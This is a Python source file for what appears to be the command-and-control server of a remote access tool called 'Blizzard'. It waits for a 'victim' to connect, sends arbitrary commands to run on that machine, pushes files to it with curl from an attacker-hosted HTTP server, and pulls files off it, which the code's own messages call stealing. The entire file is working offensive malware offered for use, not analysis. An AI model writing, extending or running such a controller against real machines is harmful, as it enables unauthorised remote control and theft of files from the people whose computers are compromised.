import socket, socketserver, http.server
import random
import subprocess
import threading

# Function to start HTTP server
def http_server(PORT_HTTP):
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT_HTTP), handler) as httpd:
        print(f"HTTP server listening on port {PORT_HTTP}")
        httpd.serve_forever()

# Main function to handle the TCP server
def main():
    # Socket for the command-and-control server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    HOST = socket.gethostbyname(socket.gethostname())  # Change to the IP of your machine
    PORT = 13921
    PORT_HTTP = 8003

    # Bind and listen for incoming connections
    server.bind((HOST, PORT))
    server.listen(1)
    print("WELCOME TO THE BLIZZARD!!!")
    print("If you want to send the victim a file type the command: 'send_file example.txt' and make sure the file is in the directory you are running Blizzard from!")
    print("If you want to start an http server in the target type the command: 'get_file' and make sure that you are in the directory you are stealing the file from!")
    print("Then you can grab the file using the 'curl' command!")
    print("")
    print("Waiting for victim to connect...")
    # Start the HTTP server in a separate thread
    t1 = threading.Thread(target=http_server, args=(PORT_HTTP,))
    t1.daemon = True  # Ensures the HTTP server thread will close when the main thread closes
    t1.start()
    print(f"Blizzard listening on port {PORT}")
    while True:
        client, address = server.accept()
        print(f"WE GOT ONE: {address[0]}")


        # Receive and send commands to the client
        try:
            while True:
                command = input("Command on victim: ")
                if command.lower() == "exit":
                    print("Closing connection.")
                    break
                if command.startswith("send_file"):
                    command = f"curl -O http://{HOST}:{PORT_HTTP}/{command.split()[1]}"                    
                if command.startswith("get_file"):
                    http_target_port = random.randint(40000,49000)
                    command = f"get_file {http_target_port}"
                client.send(command.encode("utf-8"))
                if command.startswith("get_file"):
                    subprocess.run(f"curl -O http://{address[0]}:{http_target_port}/{command.split()[1]}".split(), capture_output=True, text=True)
                response = client.recv(1024).decode("utf-8")
                print(response)
        except IndentationError:
            print("The victim disconnected.")
        finally:
            client.close()

if __name__ == "__main__":
    main()
